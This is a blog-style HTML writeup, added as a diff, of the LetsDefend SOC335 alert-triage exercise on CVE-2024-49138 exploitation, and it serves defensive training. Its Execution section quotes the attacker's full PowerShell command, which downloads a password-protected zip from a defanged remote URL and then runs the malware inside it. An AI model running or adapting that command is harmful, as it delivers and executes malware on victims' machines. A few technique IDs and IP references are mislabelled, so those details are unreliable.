@@ -1,0 +1,196 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>LetsDefend SOC335 - CVE-2024-49138 Exploitation Detected | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="LetsDefend SOC335 - CVE-2024-49138 Exploitation Detected" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthorugh/Writeup for SOC335, a LetsDefend SOC practice exercise" />
+<meta property="og:description" content="Walkthorugh/Writeup for SOC335, a LetsDefend SOC practice exercise" />
+<link rel="canonical" href="http://localhost:4000/letsdefend/SOC335/" />
+<meta property="og:url" content="http://localhost:4000/letsdefend/SOC335/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="LetsDefend SOC335 - CVE-2024-49138 Exploitation Detected" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthorugh/Writeup for SOC335, a LetsDefend SOC practice exercise","headline":"LetsDefend SOC335 - CVE-2024-49138 Exploitation Detected","url":"http://localhost:4000/letsdefend/SOC335/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=3d8937802201c759593e1f69618423ea7fcc519f">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="soc335---cve-2024-49138-exploitation-detected">SOC335 - CVE-2024-49138 Exploitation Detected<!-- omit in toc --></h1>
+
+<p>This <a href="https://app.letsdefend.io/monitoring">LetsDefend SOC practice</a> exercise revolves around CVE-2024-49138 exploitation.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#alert">Alert</a></li>
+  <li><a href="#hint">Hint</a></li>
+  <li><a href="#analysis">Analysis</a>
+    <ul>
+      <li><a href="#initial-access">Initial access</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="alert">Alert</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EventID : 313 Event Time :
+2025-01-22T02:37:00+03:00
+Rule : SOC335 - CVE-2024-49138 Exploitation Detected
+Role : Security Analyst
+Alert Type : Privilege Escalation
+Difficulty : Medium
+MITRE ATT&amp;CK : T1059.001 T1055 T1068 T1548 T1110
+Hostname : Victor
+File Hash : b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9
+Ip Address : 172.16.17.207
+Process ID : 7640
+Command Line : \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+Process Name : svohost.exe
+Process Path : "C:\temp\service_installer\svohost.exe"
+Process User : EC2AMAZ-ILGVOIN\LetsDefend
+Device Action : Allowed
+Parent Process : C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
+Trigger Reason : Unusual or suspicious patterns of behavior linked to the hash have been identified, indicating potential exploitation of CVE-2024-49138.
+</code></pre></div></div>
+
+<p>This alert comes from Victor’s machine (<code class="language-plaintext highlighter-rouge">172.16.17.207</code>). An unusual/suspicious behaviour has been detected in the execution of <code class="language-plaintext highlighter-rouge">svohost.exe</code> process (which looks very similar to the legitimate <a href="https://en.wikipedia.org/wiki/Svchost.exe"><code class="language-plaintext highlighter-rouge">svchost.exe</code></a> process) by an EDR.</p>
+
+<p>The behaviour in question is the <code class="language-plaintext highlighter-rouge">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</code> command being executed by <code class="language-plaintext highlighter-rouge">svohost.exe</code>. This command, in fact, starts an hidden console session.</p>
+
+<p>The <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> techniques this alert falls into are:</p>
+
+<ul>
+  <li><a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>: Command and Scripting Interpreter: PowerShell;</li>
+  <li><a href="https://attack.mitre.org/techniques/T1055/">T1055</a>: Process Injection;</li>
+  <li><a href="https://attack.mitre.org/techniques/T1068/">T1055</a>: Exploitation for Privilege Escalation;</li>
+  <li><a href="https://attack.mitre.org/techniques/T1548/">T1548</a>: Abuse Elevation Control Mechanism;</li>
+  <li><a href="https://attack.mitre.org/techniques/T1110/">T1110</a>: Brute Force.</li>
+</ul>
+
+<h2 id="hint">Hint</h2>
+
+<p>*Check the hash of malware on VT, and see the process users. *</p>
+
+<p>Since we know that this alert is about malware, the hint is telling us to look up the <code class="language-plaintext highlighter-rouge">svohost.exe</code> file digest (or hash), <code class="language-plaintext highlighter-rouge">b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9</code>, on <a href="https://www.virustotal.com/gui/">VT (Virus Total)</a>. This search will return that <a href="https://www.virustotal.com/gui/file/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9">49/71 security vendors flagged this file as malicious</a>. VT will also return that this malware runs this exact command: <a href="https://www.virustotal.com/gui/file/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9/behavior#:~:text=C%3A%5CWindows%5Csystem32%5Cconhost%2Eexe%200xffffffff%20%2DForceV1"><code class="language-plaintext highlighter-rouge">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</code></a>. This is also the reason why the platform shows that the <a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a> (Command and Scripting Interpreter: PowerShell) technique is involved.</p>
+
+<h2 id="containment">Containment</h2>
+
+<p>Knowing that malware has been executed on Victor’s machine, we need to contain it to avoid lateral movement. We can do so by going to “Endpoint Security” and then switching the “Containment” button to “Contained”, like this:</p>
+
+<p><img src="/assets/images/ld/soc335/containment.png" alt="Containment" /></p>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>Now that we know what triggered the alert and that the host has been contained, we can dive into it more.</p>
+
+<h3 id="initial-access">Initial access</h3>
+
+<p>Let’s see how the attacker got inside Victor’s machine from the “Log Management” section. After checking for logs matching Victor’s IP address (<code class="language-plaintext highlighter-rouge">172.16.17.207</code>) like this: <code class="language-plaintext highlighter-rouge">Destination Address contains "172.16.17.207"</code> we can see 4 <code class="language-plaintext highlighter-rouge">4625(An account failed to log on)</code> events followed by an <code class="language-plaintext highlighter-rouge">4624(An account was successfully logged on.)</code> event, all coming from <code class="language-plaintext highlighter-rouge">185.107.56.141</code>:</p>
+
+<p><img src="/assets/images/ld/soc335/logs.png" alt="Logs" /></p>
+
+<p>This means that <code class="language-plaintext highlighter-rouge">185.107.56.141</code> got access to a RemoteInteractive session (such as <a href="https://it.wikipedia.org/wiki/Remote_Desktop_Protocol">RDP</a> by brute forcing (<a href="https://attack.mitre.org/techniques/T1110/">T1110</a>: Brute Force).</p>
+
+<h3 id="execution">Execution</h3>
+
+<p>Let’s see what happenedafter the attacker got inside. Let’s head to “Endpoint Security” and look for <code class="language-plaintext highlighter-rouge">Victor</code>’s machine (<code class="language-plaintext highlighter-rouge">185.107.56.141</code>). In the “Terminal History” section we’ll see:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$url = 'hxxps://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer[.]zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"
+</code></pre></div></div>
+
+<p>being executed at <code class="language-plaintext highlighter-rouge">Jan 22 2025 14:37:10</code>. This means that the attacker executed a PowerShell (<a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>: Command and Scripting Interpreter: PowerShell) script that:</p>
+
+<ol>
+  <li>downloads (<code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code>) <code class="language-plaintext highlighter-rouge">hxxps://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer[.]zip</code> as <code class="language-plaintext highlighter-rouge">C:\temp\service-installer.zip</code>;</li>
+  <li>extracts <code class="language-plaintext highlighter-rouge">C:\temp\service-installer.zip</code> in <code class="language-plaintext highlighter-rouge">$extractPath\service_installer\svohost.exe</code>;</li>
+  <li>executes (<code class="language-plaintext highlighter-rouge">Start-Process</code>) <code class="language-plaintext highlighter-rouge">svohost.exe</code>.</li>
+</ol>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>While taking a better look at <a href="https://www.virustotal.com/gui/file/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9">this file’s hash on VT</a>, we also notice it’s related to <a href="https://nvd.nist.gov/vuln/detail/cve-2024-49138">CVE-2024-49138</a>, a Windows privilege escalation (<a href="https://attack.mitre.org/techniques/T1068/">T1055</a>: Exploitation for Privilege Escalation) vulnerability.</p>
+
+<h3 id="lateral-movement">Lateral movement</h3>
+
+<p>The attacker then contacted the 169[.]254.169.254 internal IP address, potentially causing lateral movement.</p>
+
+<h2 id="playbook">Playbook</h2>
+
+<p>Now that we know more about this alert, we can create a ticket and start the playbook:</p>
+
+<ul>
+  <li>between “Unknown or unexpected outgoing internet traffic”, “Anti-virus programs malfuntioning or becoming  disabled for unknown reasons”, “Unknown or unexpected services and applications configured to launch automatically on system boot” and Other, we must choose “Unknown or unexpected services and applications configured to launch automatically on system boot”;</li>
+  <li>between “Not Quarantined” and “Quarantined” we must choose “Not Quarantined” since the malware execution was allowed;</li>
+  <li>between “Malicious” and “Not Mailicious” we must choose “Malicious”, as we checked on VT;</li>
+  <li>between “Accessed” and “Not accessed” choose “Accessed”;</li>
+  <li>since we already contained the host, click “Next”.</li>
+</ul>
+
+<p>All of these 9indicators make us come to the conclusion that this alert was a “True Positive”.</p>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
